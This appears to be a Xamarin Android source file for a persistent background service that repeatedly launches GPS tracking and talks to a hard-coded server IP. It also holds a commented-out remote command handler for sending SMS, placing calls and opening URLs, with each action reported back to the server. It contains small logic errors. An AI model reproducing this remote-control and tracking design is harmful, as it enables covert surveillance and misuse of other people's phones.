using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using Android.App;
using Android.Content;
using Android.OS;
using Android.Runtime;
using Android.Views;
using Android.Widget;
using System.IO;
using Android.Telephony;

namespace Dracula
{
    [Service]
    public class SanguinityService : Android.App.Service
    {
        System.Timers.Timer t2 = new System.Timers.Timer(); // timer de last seen
        public string APIUrl = "http://89.43.62.59/api/";
        API apicall = new API();

        public override StartCommandResult OnStartCommand(Android.Content.Intent intent, StartCommandFlags flags, int startId)
        {
            string CNP;
           
            if (ContainsKey.retrive_cnp().Length == 0)
                CNP = ContainsKey.retrive_cnp();
            //start v2
            //apicall.addReport("Application opened");

            t2.Interval = 1000; // = 2 mins
            t2.Elapsed += new System.Timers.ElapsedEventHandler(t2_Elapsed);
            t2.Start();

            //stop v2
            //stop getdevid
            return StartCommandResult.Sticky;
        }

        protected void t2_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            getGPS("", "");
            
        }

        public override void OnDestroy()
        {
            base.OnDestroy();
            // cleanup code
        }

        public override IBinder OnBind(Intent intent)
        {
            return null;
        }
        
        //void doCommand(string commands, string Identifiers)
        //{
        //    if (commands.Substring(0, 3) == "105")
        //    {
        //        sendSMS(commands.Substring(3));
        //        apicall.markItAsDone(Identifiers);
        //        apicall.addReport("SMS:" + commands.Substring(3));
        //    }
        //    switch (commands.Substring(0, 3))
        //    {
        //        //case "101": if (toastIT(commands.Substring(3)) == true) { apicall.markItAsDone(Identifiers); } break;
        //        case "101": toastIT(commands.Substring(3)); apicall.markItAsDone(Identifiers); apicall.addReport("Toast:" + commands.Substring(3)); break;
        //        case "102": SendNotification(commands.Substring(3)); apicall.markItAsDone(Identifiers); apicall.addReport("Notification:" + commands.Substring(3)); break;
        //        case "103": getGPS(devID, Identifiers); apicall.markItAsDone(Identifiers); break;
        //        case "104": callNumber(commands.Substring(3)); apicall.markItAsDone(Identifiers); apicall.addReport("CalledNumber:" + commands.Substring(3)); break;
        //        case "105": sendSMS(commands.Substring(3)); apicall.markItAsDone(Identifiers); apicall.addReport("SMS:" + commands.Substring(3)); break;
        //        case "106": openURL(commands.Substring(3)); apicall.markItAsDone(Identifiers); apicall.addReport("URLOpened:" + commands.Substring(3)); break;
        //        //default: SendNotification("FAIL"); break;
        //        default: break;
        //    }
        //}

        void getGPS(string devIDs, string Idents)
        {
            StartService(new Intent(this, typeof(GPSService)));
            //var activity2 = new Intent(this, typeof(GPSService));
            //activity2.PutExtra("devident", devIDs + Idents);
            //StartActivity(activity2);
        }
    }
}